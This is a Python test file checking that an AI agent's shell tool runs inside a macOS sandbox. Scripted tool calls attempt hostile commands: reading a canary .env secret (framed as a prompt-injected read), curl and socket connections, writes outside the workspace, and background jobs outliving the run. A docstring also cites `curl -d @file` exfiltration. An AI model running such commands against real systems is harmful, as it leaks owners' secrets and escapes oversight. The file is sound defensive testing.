"""The executor's shell runs inside the macOS sandbox: no reads of the home directory or the
relay repo, no network, no writes outside the workspace, nothing outliving the run, and no
shell at all when the sandbox is unavailable. macOS only; no LLM.

Each test drives the production tools (``executor_capability``) through a real agent run with a
FunctionModel that makes the given tool calls in order. HOME points at a fake home holding a
canary secret, and the workspace sits inside that home's ``Documents`` (a denied tree), so every
test also proves the workspace stays usable under a denied parent.
"""

from __future__ import annotations

import http.server
import sys
import threading
import time
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest
from pydantic_ai import Agent
from pydantic_ai.messages import (
    ModelMessage,
    ModelRequest,
    ModelResponse,
    RetryPromptPart,
    TextPart,
    ToolCallPart,
    ToolReturnPart,
)
from pydantic_ai.models.function import AgentInfo, FunctionModel

from relay.executor.agent import ExecutorDeps, executor_capability, sandbox
from tests.conftest import REPO_ROOT

pytestmark = pytest.mark.skipif(sys.platform != "darwin", reason="sandbox-exec is macOS-only")

LOCAL_PROFILE = {"supported_native_tools": frozenset()}
SECRET = "s3cret-canary-5b2e"
SHELL_TOOLS = {"run_command", "start_command", "check_command", "stop_command", "shell"}


@dataclass
class Layout:
    home: Path
    secret: Path
    workspace: Path
    outside: Path


@pytest.fixture
def layout(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Layout:
    home = tmp_path / "home"
    secret = home / "Documents" / "relay" / ".env"
    secret.parent.mkdir(parents=True)
    secret.write_text(f"TOKEN={SECRET}\n")
    workspace = home / "Documents" / "projects" / "idea-1234abcd"
    workspace.mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    monkeypatch.setenv("HOME", str(home))
    return Layout(home, secret, workspace, outside)


def _run(workspace: Path, calls: list[tuple[str, dict[str, Any]]]) -> list[str]:
    """Make ``calls`` one per model turn through the executor tools; return each result."""

    def model(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        turn = sum(isinstance(m, ModelResponse) for m in messages)
        if turn < len(calls):
            tool, args = calls[turn]
            return ModelResponse(parts=[ToolCallPart(tool, args)])
        return ModelResponse(parts=[TextPart("done")])

    agent = Agent(
        FunctionModel(model, profile=LOCAL_PROFILE),
        deps_type=ExecutorDeps,
        capabilities=[executor_capability()],
    )
    result = agent.run_sync("go", deps=ExecutorDeps(workspace=workspace))
    return [
        str(p.content)
        for m in result.all_messages()
        if isinstance(m, ModelRequest)
        for p in m.parts
        if isinstance(p, ToolReturnPart | RetryPromptPart)
    ]


def _sh(workspace: Path, command: str) -> str:
    (out,) = _run(workspace, [("run_command", {"command": command})])
    return out


def test_reads_of_the_home_directory_are_denied(layout: Layout) -> None:
    """A prompt-injected `cat ~/Documents/relay/.env` must not reach the owner's secrets."""
    out = _sh(layout.workspace, f"cat {layout.secret}; cat ~/../home/Documents/relay/.env")
    assert SECRET not in out
    assert "Operation not permitted" in out, out


@pytest.mark.skipif(not (REPO_ROOT / ".env").exists(), reason="no relay .env on this machine")
def test_the_relay_repo_env_file_is_unreadable(layout: Layout) -> None:
    """The real relay .env (worker secrets) stays unreadable wherever the repo lives.
    Only the exit code is printed, never the content."""
    out = _sh(layout.workspace, f"cat {REPO_ROOT / '.env'} >/dev/null 2>&1; echo rc=$?")
    assert "rc=1" in out, out


@pytest.fixture
def local_server() -> Iterator[tuple[str, int, list[str]]]:
    """An HTTP server on loopback (stands in for Postgres/Ollama/the Delegator)."""
    hits: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            hits.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(SECRET.encode())

        def log_message(self, format: str, *args: Any) -> None:
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        port = server.server_address[1]
        yield f"http://127.0.0.1:{port}/x", port, hits
    finally:
        server.shutdown()
        server.server_close()


def test_network_is_denied(layout: Layout, local_server: tuple[str, int, list[str]]) -> None:
    """Without a network deny, `curl -d @file https://x` exfiltrates and `git push` works."""
    url, port, hits = local_server
    connect = f"import socket; socket.create_connection(('127.0.0.1', {port}), timeout=3)"
    out = _sh(
        layout.workspace,
        f'curl -s -m 3 {url}; echo curl=$?; python3 -c "{connect}"; echo py=$?',
    )
    assert SECRET not in out
    assert "curl=0" not in out and "py=0" not in out, out
    assert hits == []  # nothing reached the server


def test_writes_only_inside_the_workspace(layout: Layout) -> None:
    """Without a write deny, a command can plant files anywhere the owner can write."""
    target = layout.outside / "planted.txt"
    out = _sh(
        layout.workspace,
        f"echo x > {target}; echo inside > note.txt;"
        ' t=$(mktemp "$TMPDIR/x.XXXXXX") && echo tmp > "$t" && echo tmp=ok',
    )
    assert not target.exists(), out
    assert (layout.workspace / "note.txt").read_text() == "inside\n"
    assert "tmp=ok" in out, out  # $TMPDIR (inside the workspace) is writable
    py_tmp = "python3 -c 'import tempfile; print(\"tmp=\" + tempfile.mkstemp()[1])'"
    assert f"tmp={layout.workspace.resolve()}/.tmp/" in _sh(layout.workspace, py_tmp)


def test_ordinary_commands_still_work(layout: Layout) -> None:
    """A sandbox so tight that python3, ls or local git fail makes the shell useless."""
    (layout.workspace / "hello.txt").write_text("hi\n")
    out = _sh(
        layout.workspace,
        "python3 -c 'print(40 + 2)' && ls && grep -c hi hello.txt"
        " && git init -q . && git status --short && echo all=ok",
    )
    assert "42" in out and "hello.txt" in out and "all=ok" in out, out


def test_background_commands_die_with_the_run(layout: Layout) -> None:
    """The persistent `shell` tool left commands running after the run and worker restarts."""
    beat = layout.workspace / "beat"
    _run(
        layout.workspace,
        [
            ("start_command", {"command": "while :; do echo b >> beat; sleep 0.1; done"}),
            ("run_command", {"command": "sleep 1"}),
        ],
    )
    assert beat.exists() and beat.stat().st_size > 0  # it really ran inside the sandbox
    size = beat.stat().st_size
    time.sleep(1.0)
    assert beat.stat().st_size == size  # no heartbeat after the run ended


def test_no_shell_without_the_sandbox(layout: Layout, monkeypatch: pytest.MonkeyPatch) -> None:
    """Fail closed: a missing sandbox-exec must drop the shell, never run it unsandboxed."""
    monkeypatch.setattr(sandbox, "sandbox_exec_path", lambda: None)
    offered: list[str] = []

    def model(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        offered.extend(t.name for t in info.function_tools)
        return ModelResponse(parts=[TextPart("done")])

    agent = Agent(
        FunctionModel(model, profile=LOCAL_PROFILE),
        deps_type=ExecutorDeps,
        capabilities=[executor_capability()],
    )
    agent.run_sync("go", deps=ExecutorDeps(workspace=layout.workspace))
    assert "web_fetch" in offered  # the rest of the tool set is still there
    assert not SHELL_TOOLS & set(offered), offered
